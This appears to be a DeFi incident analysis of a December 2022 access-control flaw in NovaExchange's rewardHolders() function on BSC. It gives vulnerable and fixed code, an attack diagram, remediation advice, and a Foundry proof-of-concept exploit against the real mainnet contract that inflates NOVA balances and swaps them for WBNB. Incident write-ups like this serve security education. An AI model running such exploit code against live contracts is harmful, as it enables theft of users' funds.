# NovaExchange — rewardHolders() Access Control Flaw Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | NovaExchange |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **NovaExchange** | [0xB5B27564D05Db32CF4F25813D35b6E6de9210941](https://bscscan.com/address/0xB5B27564D05Db32CF4F25813D35b6E6de9210941) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | The `rewardHolders(uint256 amount)` function lacks access control, allowing anyone to call it with an arbitrary amount and manipulate the internal reward distribution logic |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/NovaExchange_exp.sol) |

---
## 1. Vulnerability Overview

NovaExchange included a `rewardHolders()` function for distributing rewards to NOVA token holders. This function was externally callable by anyone without `onlyOwner` or similar access control. The attacker called this function with an extremely large amount (`10_000_000_000_000_000_000_000_000_000` tokens) to manipulate the internal reward distribution logic. This caused the attacker's NOVA balance to be abnormally manipulated or an excessive amount of NOVA to be distributed from the contract. The attack occurred at BSC block 23,749,678, and the attacker's address was 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable NovaExchange - rewardHolders() missing access control
contract NovaExchange {
    mapping(address => uint256) private _balances;
    uint256 public totalSupply;

    // ❌ Anyone can call with an arbitrary amount
    function rewardHolders(uint256 amount) external {
        // ❌ Missing: require(msg.sender == owner, "Not owner");
        // ❌ Missing: require(amount <= maxRewardAmount, "Too large");

        // Manipulates internal balances based on amount
        // Extremely large amount → overflow or abnormal distribution
        _distributeReward(amount);
    }

    function _distributeReward(uint256 amount) internal {
        // Distributes amount proportionally to holders
        // ❌ Internal state corrupted by unvalidated large amount
        for (uint256 i = 0; i < holders.length; i++) {
            uint256 share = amount * _balances[holders[i]] / totalSupply;
            _balances[holders[i]] += share;
        }
    }
}

// ✅ Correct pattern - access control + amount cap validation
contract SafeNovaExchange {
    address public owner;
    uint256 public constant MAX_REWARD = 1_000_000 * 1e18;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // ✅ Only callable by owner, amount cap enforced
    function rewardHolders(uint256 amount) external onlyOwner {
        require(amount <= MAX_REWARD, "Exceeds max reward");
        require(amount <= _balances[address(this)], "Insufficient balance");
        _distributeReward(amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**NovaExchange_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `rewardHolders(uint256 amount)` function lacks access control, allowing anyone to call it with an arbitrary large amount and manipulate the internal reward distribution logic
    function rewardHolders(uint256 arg0) external {}  // 0xe6bd7ed1  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72)
    │
    ├─[1] NovaExchange.rewardHolders(
    │       10_000_000_000_000_000_000_000_000_000
    │     ) called
    │       ❌ No access control
    │       ❌ No amount cap
    │       → Internal reward logic manipulated with an extremely large amount
    │
    ├─[2] Internal distribution logic executes
    │       Abnormally large reward allocated to attacker's address
    │       or overflow triggered in balance calculation
    │
    ├─[3] Attacker's NOVA balance inflated dramatically
    │
    ├─[4] NOVA → WBNB swap (PancakeSwap)
    │       Inflated NOVA balance → realized as WBNB
    │
    └─[5] Net profit: WBNB arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface INovaExchange {
    function rewardHolders(uint256 amount) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract NovaExchangeExploit is Test {
    INovaExchange nova   = INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);
    IERC20        WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address        attacker = 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72;

    function setUp() public {
        vm.createSelectFork("bsc", 23_749_678);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(attacker), 18);

        // [Step 1] Call rewardHolders() with a near-infinite amount
        // ⚡ No access control → internal reward logic manipulated
        nova.rewardHolders(10_000_000_000_000_000_000_000_000_000);

        // [Steps 2–3] Swap inflated NOVA balance for WBNB
        IERC20 NOVA = IERC20(address(nova));
        NOVA.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(NOVA); path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NOVA.balanceOf(attacker), 0, path, attacker, block.timestamp
        );

        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(attacker), 18);
        vm.stopPrank();
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | `rewardHolders()` missing access control + no amount cap |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | Single call to `rewardHolders(max_value)` → NOVA balance manipulation → NOVA→WBNB swap |
| **Preconditions** | `rewardHolders()` function missing `onlyOwner`, no input amount cap |
| **Impact** | WBNB arbitrage profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Add Access Control**: Add an `onlyOwner` or `onlyGovernance` modifier to `rewardHolders()` to restrict calls to authorized addresses only.
2. **Input Validation**: Set an upper bound on the `amount` parameter (`require(amount <= maxAllowed)`) and ensure it cannot exceed the contract's held balance.
3. **Internalize Reward Distribution**: Change the reward distribution to execute automatically within the token transfer hook (`_transfer`) rather than via an external call, eliminating the possibility of external manipulation.

---
## 7. Lessons Learned

- **Access Control for Reward Functions**: Token reward distribution functions are directly tied to economic incentives and therefore always require strong access control. Functions such as `rewardHolders()`, `distributeReward()`, and `notifyRewardAmount()` must explicitly restrict who is permitted to call them.
- **Extreme Input Testing**: During security testing, all public functions should be tested with extreme input values (`type(uint256).max`). Without defensive logic for out-of-range inputs, a protocol can be destroyed by a simple call — exactly as in this attack.
- **No Flash Loan Required**: This attack was completed simply by calling a single poorly designed function — no flash loan or complex manipulation was needed. Access control flaws are among the simplest yet most devastating vulnerability classes.